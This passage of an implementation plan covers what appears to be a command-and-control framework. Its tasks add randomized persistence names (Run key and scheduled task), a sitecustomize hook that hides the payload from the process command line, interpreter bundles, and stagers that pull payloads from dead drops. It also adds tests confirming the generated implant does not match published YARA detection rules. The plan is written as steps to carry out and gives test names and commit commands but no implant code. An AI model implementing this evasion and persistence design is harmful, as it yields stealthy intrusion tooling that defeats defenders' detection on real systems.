Expected: FAIL.

- [ ] **Step 3: Implement generated names and the hook renderer**

Names are generated once per build and travel in the config block, so `_exec_persist` and `_exec_unpersist` read one value instead of each carrying the literal. `render_sitecustomize` emits the `runpy.run_path` hook; the `argc` variant adds the `Py_GetArgcArgv` check. The default is `path`, and the docstring must carry the reason — the argc shape is what the write-up's investigators followed — so the next reader does not "fix" the default.

- [ ] **Step 4: Run to verify they pass**

Run: `python3 -m unittest software.tests.test_tunnel_persistence -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add software/c2/beacon.py software/c2/server.py software/tests/test_tunnel_persistence.py
git commit -m "fix(persistence): stop shipping one hardcoded name in every deployment"
```

---

### Task 12: The interpreter bundle builder

**Files:**
- Create: `tools/build_interpreter_bundle.py`
- Test: `software/tests/test_tunnel_bundle.py`

**Interfaces:**
- Consumes: Task 11's `render_sitecustomize`
- Produces: `build_bundle(distribution_zip, payload_source, *, base_dir, payload_name, gate, out_path) -> dict` returning `{"path", "sha256", "entry"}`; a CLI taking `--distribution`, `--expect-sha256`, `--payload`, `--out`

- [ ] **Step 1: Write the failing tests**

```python
def test_a_distribution_whose_hash_does_not_match_is_refused(self)
def test_the_pth_gains_import_site(self)
def test_sitecustomize_lands_under_Lib(self)
def test_the_payload_lands_under_the_generated_name(self)
def test_the_bundle_hash_is_printed_as_a_pasteable_entry(self)
def test_rebuilding_with_the_same_inputs_gives_the_same_hash(self)   # fixed mtimes, sorted order
def test_no_upload_is_attempted(self)                                 # no network call in the module at all
```

Use a small fabricated zip that mimics the distribution's layout; the real one is 11 MB and is not a test fixture.

- [ ] **Step 2: Run to verify they fail**

Run: `python3 -m unittest software.tests.test_tunnel_bundle -v`
Expected: FAIL on the import.

- [ ] **Step 3: Implement `tools/build_interpreter_bundle.py`**

Verify the distribution against `--expect-sha256` before opening it, insert `Lib/sitecustomize.py`, append `import site` to the `._pth`, write the payload under the build's name, and emit a reproducible zip — fixed timestamps and sorted entries, so two operators building the same inputs can compare hashes. It uploads nothing and it knows no URLs: the operator uploads and pastes the entry, which is the scope chosen in the design.

- [ ] **Step 4: Run to verify they pass**

Run: `python3 -m unittest software.tests.test_tunnel_bundle -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add tools/build_interpreter_bundle.py software/tests/test_tunnel_bundle.py
git commit -m "feat(tunnel): assemble the interpreter bundle reproducibly, and upload nothing"
```

---

### Task 13: The stager

**Files:**
- Create: `software/c2/stagers/windows.ps1.tmpl`, `software/c2/stagers/posix.sh.tmpl`
- Modify: `software/c2/server.py` (generator output gains `stager_win`, `stager_nix`)
- Test: `software/tests/test_tunnel_stager.py`

**Interfaces:**
- Consumes: Task 9's config block, Task 12's bundle entries
- Produces: `render_stager(platform: str, *, oneliner: str, drops: List[dict], base_dir: str) -> str`; generator response keys `stager_win` and `stager_nix`

- [ ] **Step 1: Write the failing tests**

```python
def test_rendered_stager_runs_the_oneliner_when_a_python_is_found(self)
def test_rendered_stager_walks_the_drops_in_order(self)
def test_rendered_stager_contains_no_psk_and_no_private_key(self)
def test_an_empty_drop_list_renders_a_stager_that_only_probes(self)
def test_generator_emits_both_stagers(self)

# Review Focus: a dead drop that answers with the wrong bytes
def test_a_truncated_bundle_is_refused_on_the_hash(self)
def test_an_html_error_page_served_as_200_is_refused_on_the_hash(self)
def test_the_next_drop_is_tried_after_a_hash_failure(self)
def test_every_drop_failing_leaves_nothing_written_and_exits_non_zero(self)
def test_nothing_is_executed_before_the_hash_matches(self)
```

Test the fetch-and-verify logic by rendering the template and running the **posix** stager against a local HTTP server serving good, truncated and wrong-content bundles; the PowerShell path is covered on the Windows host in Task 15. Record in the test module's docstring that this is the split, so the posix test is not mistaken for coverage of both.

- [ ] **Step 2: Run to verify they fail**

Run: `python3 -m unittest software.tests.test_tunnel_stager -v`
Expected: FAIL.

- [ ] **Step 3: Implement the templates and the generator output**

Probe first: a usable interpreter means a version at or above the floor the config states. Only on finding none does the stager walk the drops, verifying each against its pinned hash before anything is unpacked and before anything is executed. There is no override and no "skip verification" path, because the anti-goal is explicit.

- [ ] **Step 4: Run to verify they pass**

Run: `python3 -m unittest software.tests.test_tunnel_stager -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add software/c2/stagers/ software/c2/server.py software/tests/test_tunnel_stager.py
git commit -m "feat(tunnel): a stager that brings an interpreter only when it finds none"
```

---

### Task 14: Not matching the rules we came from, and the documentation

**Files:**
- Create: `software/tests/data/vipertunnel.yar`, `software/tests/data/vipertunnel_typos.yar`, `software/tests/test_tunnel_yara.py`, `docs/TUNNEL.md`
- Modify: `README.md`, `docs/LISTENERS.md`
- Test: `software/tests/test_tunnel_yara.py`, plus `test_docs.py` if a *Known limits* entry is affected

**Interfaces:**
- Consumes: the generator from Task 9

- [ ] **Step 1: Write the failing tests**

```python
def test_generated_artifact_contains_no_marker_from_the_published_rules(self)   # always runs
def test_beacon_source_contains_no_marker_from_the_published_rules(self)
@unittest.skipUnless(_has_yara(), "yara engine not installed")
def test_published_rules_do_not_match_the_generated_artifact(self)
def test_the_checked_in_rules_declare_the_vt_clause_was_removed(self)
def test_readme_distinguishes_the_pivot_map_from_the_pivot(self)
def test_tunnel_doc_states_the_key_bearing_difference_from_a_listener(self)
```

The marker list is the one in the design's "Not matching the rules" section. Copy it into the test as data, not prose.

- [ ] **Step 2: Run to verify they fail**

Run: `python3 -m unittest software.tests.test_tunnel_yara -v`
Expected: FAIL. If the marker test passes immediately, that is the good case — keep it, it is a regression guard.

- [ ] **Step 3: Write the rules, the doc and the corrections**

Check in the two rules from the design's appendix with the `vt.metadata.file_type` clause removed and a header comment recording the edit and its source. `docs/TUNNEL.md` covers what an operator needs: the two objects and what each start/stop does, the per-identity SOCKS port and its credential, the crypto path and why a slow one refuses to start, the dead-drop list and the mandatory hash, and — stated where it will be read — that **the tunnel server holds key material and a listener does not**. Add a pointer in `docs/LISTENERS.md` to that sentence, and correct the README so the pivot map and the pivot are not one word.

- [ ] **Step 4: Run to verify they pass**

Run: `python3 -m unittest software.tests.test_tunnel_yara software.tests.test_docs -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add software/tests/data/ software/tests/test_tunnel_yara.py docs/TUNNEL.md docs/LISTENERS.md README.md
git commit -m "feat(tunnel): prove the artifact does not carry the strings it was derived from"
```

---

### Task 15: Verify the Windows chain on the Windows host

**Files:**
- Modify: `docs/TUNNEL.md` (a verification record section), `docs/superpowers/specs/2026-11-09-reverse-socks-tunnel-design.md` (tick the five items)
- Test: manual, recorded

**Interfaces:**
- Consumes: Tasks 11, 12, 13

- [ ] **Step 1: Verify the `._pth` behaviour**

On the Windows host, with the exact pinned distribution: does `Lib/sitecustomize.py` run as shipped? Record the answer and the edit that makes it run. **If it runs as shipped, say so** — the design predicts it does not, and a wrong prediction is worth recording.

- [ ] **Step 2: Verify the argc gate**

Run the `argc` variant under `pythonw.exe` with no arguments and with a script path. Record both numbers `Py_GetArgcArgv` reports. The whole switch rests on them.

- [ ] **Step 3: Verify persistence creation and removal**

Install under the generated name, confirm the Run key and task exist with that name and no payload path for the `argc` variant, then `unpersist` and confirm both are gone.

- [ ] **Step 4: Run the stager from nothing**

No Python on the host. Fetch from a real dead drop, verify the hash, unpack, install persistence, reach a check-in, start a tunnel, and carry one SOCKS session end to end. Then read the tunnel child's command line from the real process list and confirm it carries no payload.

- [ ] **Step 5: Record and commit**

Write what was verified, on which build, with which distribution hash, and anything that differed from the design's prediction.

```bash
git add docs/TUNNEL.md docs/superpowers/specs/2026-11-09-reverse-socks-tunnel-design.md
git commit -m "docs(tunnel): the Windows chain, verified on a real host rather than asserted"
```

---

## Final gate

- [ ] Whole suite green: `python3 -m unittest discover -s software/tests -t . -p "test_*.py"`, compared against the count recorded at execution start.
- [ ] `grep -rn "SystemHealthMonitor" software/` returns only the test that proves it is gone.
- [ ] `grep -c "" software/requirements.txt` unchanged.
- [ ] The team server still listens on exactly two sockets with the tunnel server running.
